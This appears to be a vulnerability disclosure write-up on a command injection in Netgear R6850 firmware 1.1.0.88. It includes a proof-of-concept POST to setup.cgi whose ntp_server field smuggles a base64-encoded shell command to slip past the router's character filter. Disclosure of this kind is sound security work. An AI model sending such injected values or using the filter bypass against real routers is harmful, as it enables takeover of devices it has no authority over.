# Netgear-R6850 V1.1.0.88 Command Injection(ntp_server)

![image-20240319114656029](https://github.com/funny-mud-peee/IoT-vuls/blob/main/netgear%20R6850/img/image-20240319114656029.png)

## Overview

```
* Type: Command Injection
* Supplier: Netgear (https://www.netgear.com/)
* Product: R6850 — AC2000 Smart WiFi Router
* Affect version: (lastest) 1.1.0.88
* Firmware download:https://www.downloads.netgear.com/files/GDC/R6850/R6850_V1.1.0.88.zip
```

## Vulnerability Description

When deal with  `ntp_setting` request,`ntpserver` parameter is vulnerable to OS command injection.

### POC

The effect of executing the "touch home/cmdi1.txt" command

![image-20240319145515451](https://github.com/funny-mud-peee/IoT-vuls/blob/main/netgear%20R6850/img/image-20240319145515451.png)

Due to filtering issues, base64 ciphertext injection is used

![image-20240319145649975](https://github.com/funny-mud-peee/IoT-vuls/blob/main/netgear%20R6850/img/image-20240319145649975.png)

If encryption is not performed, a filtering rule will be triggered, resulting in 403 Forbidden instead

![image-20240319145749059](https://github.com/funny-mud-peee/IoT-vuls/blob/main/netgear%20R6850/img/image-20240319145749059.png)

```http
POST /setup.cgi?id=d7dd745acc849118 HTTP/1.1
Host: 192.168.1.1
Content-Length: 197
Cache-Control: max-age=0
Authorization: Basic YWRtaW46YWRtaW4=
Upgrade-Insecure-Requests: 1
Origin: http://192.168.1.1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.1.1/FW_ntp.htm&todo=cfg_init
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: SESSION_ID_VIGOR=7:08024DADCBD0CCB4D4B176EEB674981C; SessionID_R3=rApOE9t2JImnfAH6ea1G8fW1n3SEVW0TjokH470PM0LqC0taSt3lqkuAmfCGaFlkVCPPhkpQyi6KsywsYRwkxZrIPXYO0AMv9b0ds5t7S4UiM9UFKrIvFNoRFcX4hdcs; XSRF_TOKEN=152587063; sessionid=sid1038xxx450163xxx1031695426x
Connection: close

use_ntpserver=other&ntp_server=%26dG91Y2ggaG9tZS9jb21kaTEudHh0%26&time_zone=%2B8a&h_time_zone=%2B8a&h_adjust=disable&h_use_ntpserver=other&todo=save&this_file=FW_ntp.htm&next_file=ntp_wait.htm&SID=
```

## Analysis

In the main function of `setup. cgi`, all requests with `setup. cgi` in the URL will be processed by the setup_main function

![image-20240319134651718](https://github.com/funny-mud-peee/IoT-vuls/blob/main/netgear%20R6850/img/image-20240319134651718.png)

It should be noted that a filter (`FindForbidValue`) was applied at the beginning of the function, filtering out some characters and specific functions. Here, we need to bypass the filtering rules and use base64 encryption for command injection

![image-20240319134758233](https://github.com/funny-mud-peee/IoT-vuls/blob/main/netgear%20R6850/img/image-20240319134758233.png)

Through packet capture, it can be seen that todo=save, this_file=FW_ntp.htm, so analyze the save function.

In line 816, it can be seen that when this file=FW_ntp.htm, it will go to COMMAND (v54), thus calling `rc` to execute `ntp restart`

![image-20240319151038361](https://github.com/funny-mud-peee/IoT-vuls/blob/main/netgear%20R6850/img/image-20240319151038361.png)

![image-20240319151131819](https://github.com/funny-mud-peee/IoT-vuls/blob/main/netgear%20R6850/img/image-20240319151131819.png)

In the `sub_68EFC` function, the value of `ntp_sever` will be set, which can be controlled by the user by modifying the post package body

![image-20240319150321010](https://github.com/funny-mud-peee/IoT-vuls/blob/main/netgear%20R6850/img/image-20240319150321010.png)

`rc `will call `rc_apps` and find the sub_44DAE8 function in `rc_apps`, which executes `ntp restart`

![image-20240319151445874](https://github.com/funny-mud-peee/IoT-vuls/blob/main/netgear%20R6850/img/image-20240319151445874.png)

In `ntp restart`, `start_ntp` will be called, which will cause the `ntp_server` parameter command to execute

![image-20240319151625444](https://github.com/funny-mud-peee/IoT-vuls/blob/main/netgear%20R6850/img/image-20240319151625444.png)
